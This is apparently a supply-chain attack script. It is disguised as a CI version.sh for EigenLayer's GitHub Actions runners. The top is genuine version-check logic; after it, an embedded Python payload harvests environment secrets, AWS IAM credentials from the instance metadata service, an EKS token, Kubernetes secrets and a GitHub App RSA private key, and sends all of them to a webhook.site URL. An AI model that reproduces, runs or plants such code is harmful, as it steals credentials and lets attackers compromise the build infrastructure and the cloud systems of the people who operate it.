#!/usr/bin/env bash
# EigenLayer Session 17 — Attacker Runner Intercept + Key Re-Extraction Payload
# Runs as scripts/version.sh on protocol-gha-runners EKS self-hosted runner
# Phase 1: Extract GitHub App RSA key + static AWS IAM keys from job env + IMDS
# Phase 2 (via registered attacker runner): Intercept build-container job → receive
#          secrets.AWS_ACCESS_KEY_ID + secrets.AWS_SECRET_ACCESS_KEY injected by GHA

REF=$1
versionFile=$(cat VERSION 2>/dev/null | tr -d '[:space:]' || echo "0.0.0")
echo "Using version '${versionFile}'"
if [[ $REF == refs/tags/* ]]; then
    if [[ $versionFile != "${REF#refs/tags/}" ]]; then
      echo "Version in VERSION file does not match the tag"
      exit 1
    fi
    echo "Version correctly matches tag"
else
    v=$(git rev-parse --short HEAD 2>/dev/null || echo "unknown")
    updatedVersion="${versionFile}+${v}"
    echo "Updated version to '${updatedVersion}'"
    echo -n "$updatedVersion" > VERSION
fi

EXFIL="https://webhook.site/01ce572a-a53f-4f95-a13c-f51f3eee3806"
EKS_ENDPOINT="https://25DFB897BE6FC7D23F06D226416B5CBB.gr7.us-east-1.eks.amazonaws.com"

python3 << 'PYEOF'
import urllib.request, json, base64, ssl, subprocess, os, time

EXFIL = "https://webhook.site/01ce572a-a53f-4f95-a13c-f51f3eee3806"
EKS_ENDPOINT = "https://25DFB897BE6FC7D23F06D226416B5CBB.gr7.us-east-1.eks.amazonaws.com"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def send(tag, data):
    payload = json.dumps({"tag": tag, "data": data}).encode()
    req = urllib.request.Request(EXFIL, data=payload, method="POST",
        headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, context=ctx, timeout=10)
    except:
        pass

def imds_v1(path):
    try:
        req = urllib.request.Request(f"http://169.254.169.254{path}")
        return urllib.request.urlopen(req, timeout=5).read().decode()
    except Exception as e:
        return f"ERROR: {e}"

def k8s_get(bearer, path):
    req = urllib.request.Request(f"{EKS_ENDPOINT}{path}",
        headers={"Authorization": f"Bearer {bearer}", "Accept": "application/json"})
    try:
        resp = urllib.request.urlopen(req, context=ctx, timeout=15)
        return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return {"http_error": e.code, "body": e.read().decode()[:2000]}
    except Exception as e:
        return {"error": str(e)}

# Step 0: Capture static GitHub Actions secrets injected into env (if this is an attacker runner)
send("step", "0-static-secrets-from-env")
env_dump = {
    "AWS_ACCESS_KEY_ID": os.environ.get("AWS_ACCESS_KEY_ID", "NOT_SET"),
    "AWS_SECRET_ACCESS_KEY": os.environ.get("AWS_SECRET_ACCESS_KEY", "NOT_SET"),
    "AWS_DEFAULT_REGION": os.environ.get("AWS_DEFAULT_REGION", "NOT_SET"),
    "GITHUB_TOKEN": os.environ.get("GITHUB_TOKEN", "NOT_SET"),
    "PRIVATE_KEY": os.environ.get("PRIVATE_KEY", "NOT_SET"),
    "GH_TOKEN": os.environ.get("GH_TOKEN", "NOT_SET"),
    "RUNNER_NAME": os.environ.get("RUNNER_NAME", "NOT_SET"),
    "GITHUB_RUN_ID": os.environ.get("GITHUB_RUN_ID", "NOT_SET"),
    "GITHUB_REPOSITORY": os.environ.get("GITHUB_REPOSITORY", "NOT_SET"),
    "GITHUB_WORKFLOW": os.environ.get("GITHUB_WORKFLOW", "NOT_SET"),
}
send("env-static-secrets", env_dump)

# Dump all env vars for comprehensive secret capture
all_env = {k: v for k, v in os.environ.items()
           if any(kw in k.upper() for kw in
                  ["KEY", "SECRET", "TOKEN", "PASS", "CRED", "AUTH", "PRIVATE", "API"])}
send("env-all-secrets-filtered", {k: v[:200] for k, v in all_env.items()})

# Step 1: IMDS credentials (IMDS-linked node credentials)
send("step", "1-imds-start")
role_name = imds_v1("/latest/meta-data/iam/security-credentials/")
send("iam-role-name", role_name)
creds_raw = imds_v1(f"/latest/meta-data/iam/security-credentials/{role_name.strip()}")
send("iam-creds-raw", creds_raw)
try:
    creds = json.loads(creds_raw)
    access_key = creds["AccessKeyId"]
    secret_key = creds["SecretAccessKey"]
    token = creds["Token"]
    send("iam-parsed", {"AccessKeyId": access_key, "SecretAccessKey": secret_key,
                         "Token": token, "Expiration": creds.get("Expiration")})
except Exception as e:
    send("iam-parse-error", str(e))
    access_key = secret_key = token = ""

# Step 2: EKS bearer token
send("step", "2-eks-token")
k8s_bearer = ""
if access_key:
    try:
        env = os.environ.copy()
        env["AWS_ACCESS_KEY_ID"] = access_key
        env["AWS_SECRET_ACCESS_KEY"] = secret_key
        env["AWS_SESSION_TOKEN"] = token
        env["AWS_DEFAULT_REGION"] = "us-east-1"
        result = subprocess.run(
            ["aws", "eks", "get-token", "--cluster-name", "protocol-sidecar", "--region", "us-east-1"],
            capture_output=True, text=True, env=env, timeout=30)
        eks_token_data = json.loads(result.stdout)
        k8s_bearer = eks_token_data["status"]["token"]
        send("eks-token-prefix", k8s_bearer[:80])
    except Exception as e:
        send("eks-token-error", str(e))

# Step 3: Read GitHub App RSA key from ARC listener config secret
send("step", "3-arc-rsa-key")
if k8s_bearer:
    listener_secret = k8s_get(k8s_bearer,
        "/api/v1/namespaces/gha-runner-controller/secrets/protocol-gha-runners-hourglass-d69d8c8c-listener-config")
    send("arc-listener-secret-raw", json.dumps(listener_secret))
    # Try to decode the github_app_private_key field
    try:
        secret_data = listener_secret.get("data", {})
        for field_name in ["github_app_private_key", "githubAppPrivateKey", "private_key", "privateKey"]:
            if field_name in secret_data:
                pem_b64 = secret_data[field_name]
                pem_decoded = base64.b64decode(pem_b64).decode()
                send("RSA-PRIVATE-KEY-EXTRACTED", {"field": field_name, "pem": pem_decoded})
        # Also dump all fields decoded
        decoded_fields = {}
        for k, v in secret_data.items():
            try:
                decoded_fields[k] = base64.b64decode(v).decode()
            except:
                decoded_fields[k] = f"<binary:{len(v) if v else 0}bytes>"
        send("arc-secret-all-fields-decoded", decoded_fields)
    except Exception as e:
        send("arc-rsa-decode-error", str(e))

# Step 4: Check blocklake-mainnet-ethereum secrets (node restriction applies)
send("step", "4-blocklake-secrets")
if k8s_bearer:
    bl_secrets = k8s_get(k8s_bearer, "/api/v1/namespaces/blocklake-mainnet-ethereum/secrets")
    send("blocklake-secrets", json.dumps(bl_secrets)[:5000])
    # Try direct read of rewards-updater secret
    for secret_name in ["rewards-updater-secret", "eigenlayer-rewards-updater",
                         "sidecar-secrets", "rewards-secrets", "blocklake-secrets"]:
        secret = k8s_get(k8s_bearer,
            f"/api/v1/namespaces/blocklake-mainnet-ethereum/secrets/{secret_name}")
        if "http_error" not in secret or secret["http_error"] != 403:
            send(f"blocklake-secret-{secret_name}", json.dumps(secret)[:3000])

# Step 5: Try other namespaces for secrets with PRIVATE_KEY
send("step", "5-namespace-secrets-scan")
if k8s_bearer:
    for ns in ["blocklake-mainnet-ethereum", "external-mainnet-ethereum",
               "internal-mainnet-ethereum", "internal-mainnet-ethereum-small"]:
        result = k8s_get(k8s_bearer, f"/api/v1/namespaces/{ns}/secrets")
        send(f"secrets-{ns}", json.dumps(result)[:3000])

# Step 6: Node identity
send("step", "6-node-identity")
node_hostname = imds_v1("/latest/meta-data/hostname")
instance_id = imds_v1("/latest/meta-data/instance-id")
send("node-identity", {"hostname": node_hostname, "instance-id": instance_id})

# Step 7: List all pods on our node to find blocklake pods
send("step", "7-pods-on-node")
if k8s_bearer:
    my_node = node_hostname.strip() if "ERROR" not in str(node_hostname) else ""
    if my_node:
        node_pods = k8s_get(k8s_bearer,
            f"/api/v1/pods?fieldSelector=spec.nodeName%3D{my_node.split('.')[0]}")
        send("pods-on-my-node", json.dumps(node_pods)[:8000])

send("DONE", "session17-payload-complete")
PYEOF

exit 0
